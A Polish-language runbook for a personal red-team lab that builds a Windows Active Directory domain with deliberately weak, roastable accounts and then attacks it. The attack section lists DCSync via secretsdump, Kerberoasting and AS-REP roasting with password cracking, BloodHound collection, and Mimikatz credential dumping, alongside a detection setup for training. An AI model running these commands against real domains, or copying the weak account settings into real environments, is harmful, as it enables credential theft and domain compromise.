---
title: "Faza 2 — Windows AD (runbook)"
date: 2026-08-16
tags: [lab, redteam, active-directory, windows, faza2, runbook]
---

# Faza 2 — Windows AD (runbook)

Runbook promocji wlasnego VPS do prawdziwego Windows AD, gdzie natywnie dzialaja
DCSync, Kerberoasting, AS-REP, Mimikatz, Rubeus, SharpHound (w Sambie 4.19 te
techniki maja znane niuanse — patrz [[Status_Lab]]).

Hasla: uzyj **tych samych slabych hasel** co w Sambie (`/root/redteam-lab-secrets/env`):
alice, bob, carol, svc_sql, svc_backup, asrep_user. Nie wpisuj ich do vaulta.

Powiązane: [[Status_Lab]] · [[Detekcja]] · [[Lab/Hosts]]

## 0. Decyzja o hoście

| Host | Uwaga |
|------|-------|
| .781193 (wolny) | **preferowany** — nie zakłóca RE |
| .57 (RE box) | promocja do DC = koniec RE na tym boxie — tylko za zgoda |

## 1. Promocja DC (PowerShell, Windows Server 2022)

```powershell
# statyczny IP + nazwa
Rename-Computer -NewName "DC01" -Restart

# po restarcie (Administrator):
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Import-Module ADDSDeployment
Install-ADDSForest -DomainName "xmask.lab" -DomainNetbiosName "XMASK"   -ForestMode "WinThreshold" -DomainMode "WinThreshold"   -InstallDns:$true -CreateDnsDelegation:$false   -SafeModeAdministratorPassword (ConvertTo-SecureString "STRONG_HERE" -AsPlainText -Force) -Force
# restart -> DC gotowy
```

## 2. Konta domeny (mirror Samby)

```powershell
Import-Module ActiveDirectory
# alice (low-priv), bob+carol (spray), svc_sql+svc_backup (SPN), asrep_user (no-preauth)
New-ADUser -Name alice -SamAccountName alice -AccountPassword (ConvertTo-SecureString "ALICE_PW" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true
New-ADUser -Name bob   -SamAccountName bob   -AccountPassword (ConvertTo-SecureString "SPRAY_PW" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true
New-ADUser -Name carol -SamAccountName carol -AccountPassword (ConvertTo-SecureString "SPRAY_PW" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true
New-ADUser -Name svc_sql -SamAccountName svc_sql -AccountPassword (ConvertTo-SecureString "SQL_PW" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true
New-ADUser -Name svc_backup -SamAccountName svc_backup -AccountPassword (ConvertTo-SecureString "BACKUP_PW" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true
New-ADUser -Name asrep_user -SamAccountName asrep_user -AccountPassword (ConvertTo-SecureString "ASREP_PW" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true

# SPN -> Kerberoasting
setspn -A "MSSQLSvc/dc01.xmask.lab:1433" svc_sql
setspn -A "backup/dc01.xmask.lab" svc_backup

# AS-REP roastable: UF_NORMAL_ACCOUNT(0x200) + UF_DONT_REQUIRE_PREAUTH(0x400000) = 4194816
Set-ADUser -Identity asrep_user -Replace @{userAccountControl=4194816}
```

## 3. Klient domeny (target do lateral movement)

```powershell
Add-Computer -DomainName xmask.lab -Credential (Get-Credential XMASK\Administrator) -Restart
```

## 4. Atak natywny (z Kali, DC_IP = IP Windows DC)

```bash
# DCSync (działa na Windows DC)
impacket-secretsdump -just-dc "xmask.lab/administrator:ADMIN_PW@DC_IP"

# Kerberoasting (działa)
impacket-GetUserSPNs -dc-ip DC_IP "xmask.lab/alice:ALICE_PW" -request -outputfile spn.txt
john --format=krb5tgs --wordlist=/opt/wordlists/lab-passwords.txt spn.txt

# AS-REP roasting (działa)
impacket-GetNPUsers -dc-ip DC_IP -usersfile users.txt "xmask.lab/" -no-pass -format john
john --format=krb5asrep --wordlist=/opt/wordlists/lab-passwords.txt asrep.txt

# BloodHound (działa na Windows AD — NTLM bind OK)
bloodhound-python -u alice -p 'ALICE_PW' -d xmask.lab -ns DC_IP -c All --zip
```

Windows-native (na kliencie/DC): Mimikatz `lsadump::dcsync`, `sekurlsa::logonpasswords`,
Rubeus `kerberoast` / `asreproast`, SharpHound.exe `-c All --zip`.

## 5. Detekcja (purple) — włącz przed atakiem

- **Sysmon** na DC (konfiguracja SwiftOnSecurity).
- **Advanced Audit Policy**: 4662, 4768, 4769, 4771, 5145, 4720/4732.
- Eventy -> reguly Sigma z `detection/sigma/` ([[Detekcja]]).
- Suricata na segmencie Windows (jak faza 1).

## 6. BloodHound CE (gotowe w /opt/tools/bloodhound)

```bash
cd /opt/tools/bloodhound
# UWAGA: port 8080 zajmuje dashboard IOC (serve_dashboard.py). Zmien w .env:
#   BLOODHOUND_PORT=8081  (albo zatrzymaj dashboard)
docker compose up -d
docker compose logs bloodhound | grep -i password   # haslo startowe
# UI: http://VPS_IP:8081 (login admin)
```

Haslo startowe: `/opt/tools/bloodhound/INITIAL_PASSWORD.txt` (poza vaultem).
Ingest: wgrywasz ZIP z bloodhound-python (Administration -> File Ingest).

## Checklist wykonania fazy 2

- [ ] Wybrany VPS na DC (decyzja)
- [ ] DC spromowany (xmask.lab), konta + SPN + no-preauth
- [ ] Klient dołączony
- [ ] DCSync / Kerberoast / AS-REP / BloodHound działają z Kali
- [ ] Sysmon + audit + Sigma + Suricata detekcja
- [ ] BloodHound CE ingest danych
